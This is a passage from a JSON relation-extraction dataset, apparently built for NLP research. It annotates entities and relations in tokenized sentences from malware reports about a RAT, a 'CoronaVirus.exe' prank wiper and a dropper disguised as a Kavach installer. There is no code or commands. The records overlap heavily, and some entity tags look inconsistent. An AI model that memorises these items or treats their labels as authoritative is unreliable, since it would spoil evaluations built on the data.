"MP", "sent_id": 3, "global_pos": [74, 74], "name": "RAT", "pos": [4, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [83, 83], "name": "links", "pos": [13, 14], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [98, 98], "name": "scheduled tasks", "pos": [28, 30], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [109, 109], "name": "dynamic DNS provider domain", "pos": [39, 43], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [122, 122], "name": "It", "pos": [0, 1], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [131, 131], "name": "attacker", "pos": [9, 10], "index": "14_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [138, 138], "name": "files", "pos": [16, 17], "index": "15_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [145, 145], "name": "keystrokes and screen captures", "pos": [23, 27], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [151, 151], "name": "file", "pos": [1, 2], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [160, 160], "name": "CoronaVirus.exe", "pos": [10, 11], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [173, 173], "name": "text", "pos": [5, 6], "index": "19_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [177, 177], "name": "user", "pos": [9, 10], "index": "20_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [222, 222], "name": "user", "pos": [31, 32], "index": "21_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "ST", "evidence": [0, 1, 2], "h": 1, "t": 6}, {"r": "RF", "evidence": [0, 1, 2], "h": 1, "t": 6}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [1], "h": 3, "t": 4}, {"r": "EX", "evidence": [1, 2], "t": 4, "h": 7}, {"r": "RD", "evidence": [2], "t": 5, "h": 7}, {"r": "ST", "evidence": [2], "t": 6, "h": 7}, {"r": "RF", "evidence": [2], "t": 6, "h": 7}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2, 3], "t": 8, "h": 9}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 9, "t": 11}, {"r": "ST", "evidence": [3], "h": 9, "t": 12}, {"r": "RF", "evidence": [3], "h": 9, "t": 12}, {"r": "WR", "evidence": [3, 4], "h": 9, "t": 13}, {"r": "WR", "evidence": [4], "t": 13, "h": 14}, {"r": "WR", "evidence": [4], "t": 13, "h": 14}, {"r": "RD", "evidence": [4], "h": 14, "t": 15}, {"r": "RD", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "h": 14, "t": 15}, {"r": "RD", "evidence": [4], "h": 14, "t": 15}, {"r": "RD", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "h": 14, "t": 15}, {"r": "RD", "evidence": [4], "h": 14, "t": 16}, {"r": "RD", "evidence": [4], "h": 14, "t": 16}, {"r": "WR", "evidence": [4], "h": 14, "t": 16}, {"r": "WR", "evidence": [4, 5, 6], "h": 14, "t": 19}, {"r": "CO", "evidence": [5], "h": 17, "t": 18}, {"r": "RD", "evidence": [4, 5, 6], "t": 15, "h": 19}, {"r": "WR", "evidence": [4, 5, 6], "t": 15, "h": 19}, {"r": "RD", "evidence": [4, 5, 6], "t": 16, "h": 19}, {"r": "WR", "evidence": [4, 5, 6], "t": 16, "h": 19}, {"r": "WR", "evidence": [6], "t": 19, "h": 20}, {"r": "WR", "evidence": [6], "t": 19, "h": 20}, {"r": "CO", "evidence": [6, 7], "h": 20, "t": 21}]}, {"title": "646-4", "sents": [["Inside", "the", "compressed", "archive", "was", "an", "executable", "purporting", "to", "be", "a", "signed", "order", "confirmation", "."], ["Upon", "execution", ",", "additional", "data", "was", "attempted", "to", "be", "retrieved", "but", "due", "to", "the", "server", "being", "down", ",", "it", "is", "not", "possible", "to", "identify", "the", "final", "payload", "as", "of", "the", "time", "of", "publishing", "."], ["Upon", "execution", ",", "the", "RAT", "is", "installed", "and", "persistence", "is", "achieved", "by", "creating", "links", "in", "the", "user", "'s", "startup", "folder", ",", "as", "well", "as", "the", "creation", "of", "several", "scheduled", "tasks", ",", "and", "establishing", "command", "and", "control", "communications", "with", "a", "dynamic", "DNS", "provider", "domain", ",", "which", "is", "fairly", "common", "with", "RAT", "distribution", "."], ["It", "has", "the", "same", "basic", "functionality", "and", "allows", "the", "attacker", "the", "ability", "to", "upload", "and", "download", "files", "as", "well", "as", "grab", "things", "like", "keystrokes", "and", "screen", "captures", "."], ["This", "file", "was", "found", "with", "the", "suspicious", "filename", "of", "``", "CoronaVirus.exe", "''", "of", "which", "there", "were", "many", "."], ["The", "rough", "translation", "of", "the", "text", "displayed", "to", "the", "user", "is", "``", "Deleting", "all", "files", "and", "folders", "on", "this", "computer", "-", "Coronavirus.", "``"], ["Upon", "completion", "of", "the", "counter", ",", "the", "button", "at", "the", "bottom", "became", "clickable", ",", "and", "when", "clicked", ",", "displayed", "the", "following", "message", ":", "This", "says", "it", "is", "a", "joke", "and", "the", "user", "can", "press", "Alt", "+", "F12", "to", "exit", "."], ["If", "the", "user", "pushes", "these", "buttons", ",", "it", "drops", "you", "back", "at", "the", "desktop", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "compressed archive", "pos": [2, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "executable", "pos": [6, 7], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [19, 19], "name": "data", "pos": [4, 5], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [29, 29], "name": "server", "pos": [14, 15], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "it", "pos": [18, 19], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [41, 41], "name": "payload", "pos": [26, 27], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [53, 53], "name": "RAT", "pos": [4, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [62, 62], "name": "links", "pos": [13, 14], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [77, 77], "name": "scheduled tasks", "pos": [28, 30], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [88, 88], "name": "dynamic DNS provider domain", "pos": [39, 43], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [101, 101], "name": "It", "pos": [0, 1], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [110, 110], "name": "attacker", "pos": [9, 10], "index": "11_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [117, 117], "name": "files", "pos": [16, 17], "index": "12_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [124, 124], "name": "keystrokes and screen captures", "pos": [23, 27], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [130, 130], "name": "file", "pos": [1, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [139, 139], "name": "CoronaVirus.exe", "pos": [10, 11], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [152, 152], "name": "text", "pos": [5, 6], "index": "16_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [156, 156], "name": "user", "pos": [9, 10], "index": "17_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [201, 201], "name": "user", "pos": [31, 32], "index": "18_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [212, 212], "name": "user", "pos": [2, 3], "index": "19_0"}]], "labels": [{"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0, 1], "t": 1, "h": 4}, {"r": "RD", "evidence": [1], "t": 2, "h": 4}, {"r": "ST", "evidence": [1], "t": 3, "h": 4}, {"r": "RF", "evidence": [1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1, 2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2], "h": 6, "t": 8}, {"r": "ST", "evidence": [2], "h": 6, "t": 9}, {"r": "RF", "evidence": [2], "h": 6, "t": 9}, {"r": "WR", "evidence": [2, 3], "h": 6, "t": 10}, {"r": "WR", "evidence": [3], "t": 10, "h": 11}, {"r": "WR", "evidence": [3], "t": 10, "h": 11}, {"r": "RD", "evidence": [3], "h": 11, "t": 12}, {"r": "RD", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "h": 11, "t": 12}, {"r": "RD", "evidence": [3], "h": 11, "t": 12}, {"r": "RD", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "h": 11, "t": 12}, {"r": "RD", "evidence": [3], "h": 11, "t": 13}, {"r": "RD", "evidence": [3], "h": 11, "t": 13}, {"r": "WR", "evidence": [3], "h": 11, "t": 13}, {"r": "WR", "evidence": [3, 4, 5], "h": 11, "t": 16}, {"r": "CO", "evidence": [4], "h": 14, "t": 15}, {"r": "RD", "evidence": [3, 4, 5], "t": 12, "h": 16}, {"r": "WR", "evidence": [3, 4, 5], "t": 12, "h": 16}, {"r": "RD", "evidence": [3, 4, 5], "t": 13, "h": 16}, {"r": "WR", "evidence": [3, 4, 5], "t": 13, "h": 16}, {"r": "WR", "evidence": [5], "t": 16, "h": 17}, {"r": "WR", "evidence": [5], "t": 16, "h": 17}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 18}, {"r": "CO", "evidence": [5, 6, 7], "h": 17, "t": 19}]}, {"title": "646-5", "sents": [["Upon", "execution", ",", "additional", "data", "was", "attempted", "to", "be", "retrieved", "but", "due", "to", "the", "server", "being", "down", ",", "it", "is", "not", "possible", "to", "identify", "the", "final", "payload", "as", "of", "the", "time", "of", "publishing", "."], ["Upon", "execution", ",", "the", "RAT", "is", "installed", "and", "persistence", "is", "achieved", "by", "creating", "links", "in", "the", "user", "'s", "startup", "folder", ",", "as", "well", "as", "the", "creation", "of", "several", "scheduled", "tasks", ",", "and", "establishing", "command", "and", "control", "communications", "with", "a", "dynamic", "DNS", "provider", "domain", ",", "which", "is", "fairly", "common", "with", "RAT", "distribution", "."], ["It", "has", "the", "same", "basic", "functionality", "and", "allows", "the", "attacker", "the", "ability", "to", "upload", "and", "download", "files", "as", "well", "as", "grab", "things", "like", "keystrokes", "and", "screen", "captures", "."], ["This", "file", "was", "found", "with", "the", "suspicious", "filename", "of", "``", "CoronaVirus.exe", "''", "of", "which", "there", "were", "many", "."], ["The", "rough", "translation", "of", "the", "text", "displayed", "to", "the", "user", "is", "``", "Deleting", "all", "files", "and", "folders", "on", "this", "computer", "-", "Coronavirus.", "``"], ["Upon", "completion", "of", "the", "counter", ",", "the", "button", "at", "the", "bottom", "became", "clickable", ",", "and", "when", "clicked", ",", "displayed", "the", "following", "message", ":", "This", "says", "it", "is", "a", "joke", "and", "the", "user", "can", "press", "Alt", "+", "F12", "to", "exit", "."], ["If", "the", "user", "pushes", "these", "buttons", ",", "it", "drops", "you", "back", "at", "the", "desktop", "."], ["It", "was", "initially", "submitted", "to", "various", "malware", "repositories", "with", "the", "filename", "``", ".exe", "''", "which", "translates", "to", "``", "coronavirus.", "``"]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [4, 4], "name": "data", "pos": [4, 5], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "server", "pos": [14, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "it", "pos": [18, 19], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [26, 26], "name": "payload", "pos": [26, 27], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [38, 38], "name": "RAT", "pos": [4, 5], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [47, 47], "name": "links", "pos": [13, 14], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [62, 62], "name": "scheduled tasks", "pos": [28, 30], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [73, 73], "name": "dynamic DNS provider domain", "pos": [39, 43], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [86, 86], "name": "It", "pos": [0, 1], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [95, 95], "name": "attacker", "pos": [9, 10], "index": "9_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [102, 102], "name": "files", "pos": [16, 17], "index": "10_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [109, 109], "name": "keystrokes and screen captures", "pos": [23, 27], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [115, 115], "name": "file", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [124, 124], "name": "CoronaVirus.exe", "pos": [10, 11], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [137, 137], "name": "text", "pos": [5, 6], "index": "14_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [141, 141], "name": "user", "pos": [9, 10], "index": "15_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [186, 186], "name": "user", "pos": [31, 32], "index": "16_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [197, 197], "name": "user", "pos": [2, 3], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [210, 210], "name": "It", "pos": [0, 1], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [221, 221], "name": "`` .exe ''", "pos": [11, 14], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [227, 227], "name": "`` coronavirus. ``", "pos": [17, 20], "index": "20_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 2}, {"r": "ST", "evidence": [0], "t": 1, "h": 2}, {"r": "RF", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0, 1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 6}, {"r": "ST", "evidence": [1], "h": 4, "t": 7}, {"r": "RF", "evidence": [1], "h": 4, "t": 7}, {"r": "WR", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "WR", "evidence": [2], "t": 8, "h": 9}, {"r": "WR", "evidence": [2], "t": 8, "h": 9}, {"r": "RD", "evidence": [2], "h": 9, "t": 10}, {"r": "RD", "evidence": [2], "h": 9, "t": 10}, {"r": "WR", "evidence": [2], "h": 9, "t": 10}, {"r": "RD", "evidence": [2], "h": 9, "t": 10}, {"r": "RD", "evidence": [2], "h": 9, "t": 10}, {"r": "WR", "evidence": [2], "h": 9, "t": 10}, {"r": "RD", "evidence": [2], "h": 9, "t": 11}, {"r": "RD", "evidence": [2], "h": 9, "t": 11}, {"r": "WR", "evidence": [2], "h": 9, "t": 11}, {"r": "WR", "evidence": [2, 3, 4], "h": 9, "t": 14}, {"r": "CO", "evidence": [3], "h": 12, "t": 13}, {"r": "RD", "evidence": [2, 3, 4], "t": 10, "h": 14}, {"r": "WR", "evidence": [2, 3, 4], "t": 10, "h": 14}, {"r": "RD", "evidence": [2, 3, 4], "t": 11, "h": 14}, {"r": "WR", "evidence": [2, 3, 4], "t": 11, "h": 14}, {"r": "WR", "evidence": [4], "t": 14, "h": 15}, {"r": "WR", "evidence": [4], "t": 14, "h": 15}, {"r": "CO", "evidence": [4, 5], "h": 15, "t": 16}, {"r": "CO", "evidence": [4, 5, 6], "h": 15, "t": 17}, {"r": "WR", "evidence": [6, 7], "h": 17, "t": 18}, {"r": "CO", "evidence": [7], "h": 18, "t": 19}, {"r": "CO", "evidence": [7], "h": 18, "t": 20}]}, {"title": "646-6", "sents": [["Upon", "execution", ",", "the", "RAT", "is", "installed", "and", "persistence", "is", "achieved", "by", "creating", "links", "in", "the", "user", "'s", "startup", "folder", ",", "as", "well", "as", "the", "creation", "of", "several", "scheduled", "tasks", ",", "and", "establishing", "command", "and", "control", "communications", "with", "a", "dynamic", "DNS", "provider", "domain", ",", "which", "is", "fairly", "common", "with", "RAT", "distribution", "."], ["It", "has", "the", "same", "basic", "functionality", "and", "allows", "the", "attacker", "the", "ability", "to", "upload", "and", "download", "files", "as", "well", "as", "grab", "things", "like", "keystrokes", "and", "screen", "captures", "."], ["This", "file", "was", "found", "with", "the", "suspicious", "filename", "of", "``", "CoronaVirus.exe", "''", "of", "which", "there", "were", "many", "."], ["The", "rough", "translation", "of", "the", "text", "displayed", "to", "the", "user", "is", "``", "Deleting", "all", "files", "and", "folders", "on", "this", "computer", "-", "Coronavirus.", "``"], ["Upon", "completion", "of", "the", "counter", ",", "the", "button", "at", "the", "bottom", "became", "clickable", ",", "and", "when", "clicked", ",", "displayed", "the", "following", "message", ":", "This", "says", "it", "is", "a", "joke", "and", "the", "user", "can", "press", "Alt", "+", "F12", "to", "exit", "."], ["If", "the", "user", "pushes", "these", "buttons", ",", "it", "drops", "you", "back", "at", "the", "desktop", "."], ["It", "was", "initially", "submitted", "to", "various", "malware", "repositories", "with", "the", "filename", "``", ".exe", "''", "which", "translates", "to", "``", "coronavirus.", "``"], ["The", "malware", ",", "when", "executed", "on", "systems", ",", "uses", "several", "techniques", "to", "delete", "data", "from", "both", "the", "file", "system", "and", "registry", "in", "an", "attempt", "to", "disrupt", "system", "operations", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "RAT", "pos": [4, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "links", "pos": [13, 14], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [28, 28], "name": "scheduled tasks", "pos": [28, 30], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [39, 39], "name": "dynamic DNS provider domain", "pos": [39, 43], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [52, 52], "name": "It", "pos": [0, 1], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [61, 61], "name": "attacker", "pos": [9, 10], "index": "5_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [68, 68], "name": "files", "pos": [16, 17], "index": "6_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [75, 75], "name": "keystrokes and screen captures", "pos": [23, 27], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [81, 81], "name": "file", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [90, 90], "name": "CoronaVirus.exe", "pos": [10, 11], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [103, 103], "name": "text", "pos": [5, 6], "index": "10_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [107, 107], "name": "user", "pos": [9, 10], "index": "11_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [152, 152], "name": "user", "pos": [31, 32], "index": "12_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [163, 163], "name": "user", "pos": [2, 3], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [176, 176], "name": "It", "pos": [0, 1], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [187, 187], "name": "`` .exe ''", "pos": [11, 14], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [193, 193], "name": "`` coronavirus. ``", "pos": [17, 20], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [197, 197], "name": "malware", "pos": [1, 2], "index": "17_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [209, 209], "name": "data", "pos": [13, 14], "index": "18_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [213, 213], "name": "file system", "pos": [17, 19], "index": "19_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [216, 216], "name": "registry", "pos": [20, 21], "index": "20_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0], "h": 0, "t": 3}, {"r": "RF", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "WR", "evidence": [1], "t": 4, "h": 5}, {"r": "WR", "evidence": [1], "t": 4, "h": 5}, {"r": "RD", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [1], "h": 5, "t": 7}, {"r": "RD", "evidence": [1], "h": 5, "t": 7}, {"r": "WR", "evidence": [1], "h": 5, "t": 7}, {"r": "WR", "evidence": [1, 2, 3], "h": 5, "t": 10}, {"r": "CO", "evidence": [2], "h": 8, "t": 9}, {"r": "RD", "evidence": [1, 2, 3], "t": 6, "h": 10}, {"r": "WR", "evidence": [1, 2, 3], "t": 6, "h": 10}, {"r": "RD", "evidence": [1, 2, 3], "t": 7, "h": 10}, {"r": "WR", "evidence": [1, 2, 3], "t": 7, "h": 10}, {"r": "WR", "evidence": [3], "t": 10, "h": 11}, {"r": "WR", "evidence": [3], "t": 10, "h": 11}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 12}, {"r": "CO", "evidence": [3, 4, 5], "h": 11, "t": 13}, {"r": "WR", "evidence": [5, 6], "h": 13, "t": 14}, {"r": "CO", "evidence": [6], "h": 14, "t": 15}, {"r": "CO", "evidence": [6], "h": 14, "t": 16}, {"r": "RD", "evidence": [7], "h": 17, "t": 18}, {"r": "UK", "evidence": [6, 7], "t": 15, "h": 17}, {"r": "WR", "evidence": [7], "h": 17, "t": 18}, {"r": "RD", "evidence": [7], "h": 17, "t": 19}, {"r": "RD", "evidence": [7], "h": 17, "t": 19}, {"r": "WR", "evidence": [7], "h": 17, "t": 19}, {"r": "RD", "evidence": [7], "h": 17, "t": 20}, {"r": "RD", "evidence": [7], "h": 17, "t": 20}, {"r": "WR", "evidence": [7], "h": 17, "t": 20}]}, {"title": "09_g02-0", "sents": [["The", "dropper", "executables", "are", "created", "on", "the", ".NET", "platform", ",", "which", "is", "used", "for", "initiating", "the", "attack", "."], ["After", "infecting", "an", "endpoint", ",", "the", "timezone", "is", "scanned", "with", "the", "help", "of", "the", "dropper", "to", "verify", "if", "it", "contains", "specific", "keywords", "like", "``", "India", ".", "''"], ["To", "install", "the", "Kavach", "application", ",", "a", "splash", "screen", "is", "displayed", "to", "the", "victim", "."], ["A", "malicious", "payload", "is", "downloaded", "by", "the", "downloader", "from", "an", "attacker-controlled", ",", "fake", "website", "that", "mimics", "a", "legitimate", "Indian", "government", "or", "pseudo-government", "entity", ",", "and", "then", "executed", "on", "the", "infected", "endpoint", "."], ["To", "lend", "credibility", "to", "the", "entire", "attack", "chain", ",", "the", "downloader", "downloads", "a", "legitimate", "MSI", "installer", "for", "the", "Kavach", "app", "from", "another", "attacker-managed", "website", "and", "launches", "it", "."], ["The", "downloader", "is", "responsible", "for", "obtaining", "and", "executing", "both", "the", "malicious", "payload", "and", "the", "legitimate", "Kavach", "installer", "."], ["Another", "method", "of", "initial", "infection", "vector", "is", "the", "usage", "of", "a", "significantly", "larger", "downloader", "binary", "(", "141MB", ")", ",", "which", "contains", "an", "authentic", "Kavach", "application", "installer", "(", "MSI", ")", "as", "a", "resource", "."], ["The", "installer", "(", "MSI", ")", "is", "taken", "out", "of", "the", "downloader", "'s", "resources", "in", "a", "compressed", "format", "and", "then", "executed", "on", "the", "infected", "system", "as", "a", "facade", "to", "appear", "legitimate", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "dropper", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": ".NET", "pos": [7, 8], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [21, 21], "name": "endpoint", "pos": [3, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "dropper", "pos": [14, 15], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "Kavach", "pos": [3, 4], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [62, 62], "name": "payload", "pos": [2, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [64, 64], "name": "downloaded", "pos": [4, 5], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [73, 73], "name": "website", "pos": [13, 14], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [102, 102], "name": "downloader", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [110, 110], "name": "Kavach", "pos": [18, 19], "index": "9_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [115, 115], "name": "website", "pos": [23, 24], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [121, 121], "name": "downloader", "pos": [1, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [131, 131], "name": "payload", "pos": [11, 12], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [135, 135], "name": "Kavach installer", "pos": [15, 17], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [151, 151], "name": "downloader binary", "pos": [13, 15], "index": "14_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [165, 165], "name": "MSI", "pos": [27, 28], "index": "15_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [174, 174], "name": "MSI", "pos": [3, 4], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [181, 181], "name": "downloader 's resources", "pos": [10, 13], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 8}, {"r": "ST", "evidence": [1], "t": 2, "h": 3}, {"r": "WR", "evidence": [0, 1, 2], "t": 1, "h": 4}, {"r": "WR", "evidence": [0, 1, 2], "t": 1, "h": 4}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "WR", "evidence": [3], "t": 5, "h": 6}, {"r": "RF", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [4], "h": 8, "t": 9}, {"r": "EX", "evidence": [4], "h": 8, "t": 9}, {"r": "RF", "evidence": [4], "h": 8, "t": 10}, {"r": "FR", "evidence": [4, 5], "h": 8, "t": 11}, {"r": "EX", "evidence": [5], "h": 11, "t": 12}, {"r": "CD", "evidence": [5], "h": 11, "t": 13}, {"r": "EX", "evidence": [5], "h": 11, "t": 13}, {"r": "WR", "evidence": [5, 6], "h": 11, "t": 14}, {"r": "CO", "evidence": [6, 7], "h": 15, "t": 16}]}, {"title": "09_g02-1", "sents": [["After", "infecting", "an", "endpoint", ",", "the", "timezone", "is", "scanned", "with", "the", "help", "of", "the", "dropper", "to", "verify", "if", "it", "contains", "specific", "keywords", "like", "``", "India", ".", "''"], ["To", "install", "the", "Kavach", "application", ",", "a", "splash", "screen", "is", "displayed", "to", "the", "victim", "."], ["A", "malicious", "payload", "is", "downloaded", "by", "the", "downloader", "from", "an", "attacker-controlled", ",", "fake", "website", "that", "mimics", "a", "legitimate", "Indian", "government", "or", "pseudo-government", "entity", ",", "and", "then", "executed", "on", "the", "infected", "endpoint", "."], ["To", "lend", "credibility", "to", "the", "entire", "attack", "chain", ",", "the", "downloader", "downloads", "a", "legitimate", "MSI", "installer", "for", "the", "Kavach", "app", "from", "another", "attacker-managed", "website", "and", "launches", "it", "."], ["The", "downloader", "is", "responsible", "for", "obtaining", "and", "executing", "both", "the", "malicious", "payload", "and", "the", "legitimate", "Kavach", "installer", "."], ["Another", "method", "of", "initial", "infection", "vector", "is", "the", "usage", "of", "a", "significantly", "larger", "downloader", "binary", "(", "141MB", ")", ",", "which", "contains", "an", "authentic", "Kavach", "application", "installer", "(", "MSI", ")", "as", "a", "resource", "."], ["The", "installer", "(", "MSI", ")", "is", "taken", "out", "of", "the", "downloader", "'s", "resources", "in", "a", "compressed", "format", "and", "then", "executed", "on", "the", "infected", "system", "as", "a", "facade", "to", "appear", "legitimate", "."], ["The", "actual", "attack", "implant", "is", "then", "downloaded", "from", "a", "remote", "location", ",", "decrypted", "using", "AES", "and", "a", "hardcoded", "key", ",", "stored", "on", "the", "disk", "and", "then", "executed", "on", "the", "compromised", "endpoint", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [3, 3], "name": "endpoint", "pos": [3, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [14, 14], "name": "dropper", "pos": [14, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "Kavach", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "payload", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "downloaded", "pos": [4, 5], "index": "4_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [55, 55], "name": "website", "pos": [13, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [84, 84], "name": "downloader", "pos": [10, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [92, 92], "name": "Kavach", "pos": [18, 19], "index": "7_0"}], [{"type": 